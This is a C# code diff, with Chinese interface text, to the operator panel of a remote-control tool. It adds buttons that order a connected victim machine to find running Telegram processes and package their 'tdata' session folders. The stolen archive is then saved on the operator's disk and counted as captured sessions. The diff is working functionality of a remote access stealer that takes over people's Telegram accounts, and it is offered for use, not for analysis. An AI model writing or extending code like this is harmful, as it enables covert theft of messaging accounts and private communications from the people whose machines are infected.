@@ -1,8 +1,10 @@
 using System;
 using System.Drawing;
+using System.IO;
 using System.Windows.Forms;
 using RemoteControl.Protocals;
 using RemoteControl.Protocals.Request;
+using RemoteControl.Protocals.Response;
 
 namespace RemoteControl.Server
 {
@@ -160,17 +162,30 @@ namespace RemoteControl.Server
             _logBox.AppendText(string.Format("[{0}] {1}\r\n", DateTime.Now.ToString("HH:mm:ss"), message));
         }
 
+        private void EnsureRelayBinding()
+        {
+            if (RSCApplication.oRemoteControlServer != null && _session != null)
+                RSCApplication.oRemoteControlServer.SelectClient(_session.SocketId);
+        }
+
         private void OnScanProcesses(object sender, EventArgs e)
         {
             AppendLog("正在扫描进程...");
-            // TG extraction is handled by existing TG extract protocol
             if (_session != null)
-                _session.Send(ePacketType.PACKET_TG_EXTRACT_REQUEST, new RequestTGExtract { Mode = 0 });
+            {
+                EnsureRelayBinding();
+                _session.Send(ePacketType.PACKET_TG_EXTRACT_REQUEST, new RequestTGExtract { Mode = 2 });
+            }
         }
 
         private void OnFullPackage(object sender, EventArgs e)
         {
             AppendLog("开始全打包，输出路径: " + _outputPath.Text);
+            if (_session != null)
+            {
+                EnsureRelayBinding();
+                _session.Send(ePacketType.PACKET_TG_EXTRACT_REQUEST, new RequestTGExtract { Mode = 0 });
+            }
         }
 
         private void OnPathPackage(object sender, EventArgs e)
@@ -182,6 +197,11 @@ namespace RemoteControl.Server
                 return;
             }
             AppendLog("按路径打包: " + path);
+            if (_session != null)
+            {
+                EnsureRelayBinding();
+                _session.Send(ePacketType.PACKET_TG_EXTRACT_REQUEST, new RequestTGExtract { Mode = 1, TargetPath = path });
+            }
         }
 
         private void OnPidPackage(object sender, EventArgs e)
@@ -192,7 +212,92 @@ namespace RemoteControl.Server
                 MessageBox.Show("请输入PID", "提示");
                 return;
             }
+            int pidVal = 0;
+            if (!int.TryParse(pid, out pidVal) || pidVal <= 0)
+            {
+                MessageBox.Show("请输入有效的PID数字", "提示");
+                return;
+            }
             AppendLog("按PID打包: " + pid);
+            if (_session != null)
+            {
+                EnsureRelayBinding();
+                _session.Send(ePacketType.PACKET_TG_EXTRACT_REQUEST, new RequestTGExtract { Mode = 0, TargetPid = pidVal });
+            }
+        }
+
+        public void HandleResponse(ResponseTGExtract resp)
+        {
+            if (resp == null) return;
+            if (this.InvokeRequired)
+            {
+                this.BeginInvoke((Action)(() => HandleResponse(resp)));
+                return;
+            }
+
+            if (!resp.Result)
+            {
+                AppendLog("失败: " + (resp.Message ?? "未知错误"));
+                return;
+            }
+
+            // 扫描进程结果（没有TdataZip数据）
+            if (resp.TdataZip == null || resp.TdataZip.Length == 0)
+            {
+                if (resp.ProcessInfoList != null && resp.ProcessInfoList.Length > 0)
+                {
+                    AppendLog(string.Format("扫描完成! 找到 {0} 个TG进程:", resp.ProcessInfoList.Length));
+                    for (int i = 0; i < resp.ProcessInfoList.Length; i++)
+                    {
+                        string[] parts = resp.ProcessInfoList[i].Split('|');
+                        string pid = parts.Length > 0 ? parts[0] : "?";
+                        string name = parts.Length > 1 ? parts[1] : "?";
+                        string exePath = parts.Length > 2 ? parts[2] : "";
+                        string tdataDir = parts.Length > 3 ? parts[3] : "";
+                        AppendLog(string.Format("  [{0}] PID={1} {2}", i + 1, pid, exePath));
+                        if (!string.IsNullOrEmpty(tdataDir))
+                            AppendLog("       tdata: " + tdataDir);
+                    }
+                    _scanStatus.Text = "已扫描: " + resp.ProcessInfoList.Length;
+                }
+                else
+                {
+                    AppendLog("扫描完成: 未找到运行中的TG进程");
+                    _scanStatus.Text = "已扫描: 0";
+                }
+
+                if (!string.IsNullOrEmpty(resp.TdataPath))
+                {
+                    AppendLog("找到tdata目录: " + resp.TdataPath);
+                    _pathInput.Text = resp.TdataPath;
+                }
+
+                if (resp.Found)
+                    AppendLog("提示: 可以使用'开始打包'或'按PID打包'进行提取");
+                return;
+            }
+
+            // 打包结果
+            AppendLog("找到Telegram数据! 文件: " + resp.FileName);
+            _scanStatus.Text = "已扫描: 1";
+            _sessionCount.Text = "会话数: 1 个";
+
+            try
+            {
+                string outDir = _outputPath.Text.Trim();
+                if (string.IsNullOrEmpty(outDir)) outDir = "C:\\";
+                if (!Directory.Exists(outDir))
+                    Directory.CreateDirectory(outDir);
+
+                string outFile = Path.Combine(outDir, resp.FileName);
+                File.WriteAllBytes(outFile, resp.TdataZip);
+                AppendLog("数据已保存到: " + outFile);
+                AppendLog(string.Format("文件大小: {0:F2} MB", resp.TdataZip.Length / 1024.0 / 1024.0));
+            }
+            catch (Exception ex)
+            {
+                AppendLog("保存失败: " + ex.Message);
+            }
         }
     }
 }
